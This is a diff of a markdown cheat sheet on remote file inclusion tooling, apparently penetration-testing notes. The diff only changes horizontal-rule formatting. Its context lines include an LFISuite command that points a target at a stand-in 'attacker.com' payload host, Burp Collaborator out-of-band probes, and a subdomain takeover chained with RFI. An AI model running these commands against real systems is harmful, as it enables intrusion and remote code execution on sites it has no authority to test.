@@ -17,7 +17,7 @@ linked:
 ---
 # RFI - Tooling
 
-***
+---
 
 ## LFISuite RFI Mode
 
@@ -35,7 +35,7 @@ linked:
 | `python LFISuite.py -u "https://target/?page=" --rfi-host http://attacker.com` | RFI-mode con custom payload host | RFI host config. |
 ^rfi-tool-lfisuite
 
-___
+---
 
 ## Burp Intruder + Payloads
 
@@ -56,7 +56,7 @@ ___
 | Burp Collaborator client → generate URL → use in RFI probe | OOB callback for blind RFI | OOB validation. |
 ^rfi-tool-burp
 
-___
+---
 
 ## Manual curl Scripts
 
@@ -102,7 +102,7 @@ fi
 kill $SERVER_PID
 ```
 
-___
+---
 
 ## Wordlists
 
@@ -120,7 +120,7 @@ ___
 | `git clone https://github.com/fuzzdb-project/fuzzdb && ls fuzzdb/attack/rfi/` | FuzzDB RFI corpus | Foundation. |
 ^rfi-tool-wordlists
 
-___
+---
 
 ## Otros Tools
 
@@ -140,4 +140,4 @@ ___
 | `subjack -w subs.txt -t 100` (claim sub) luego host payload + RFI probe | SDT + RFI chain | SDT combo. |
 ^rfi-tool-others
 
-***
+---
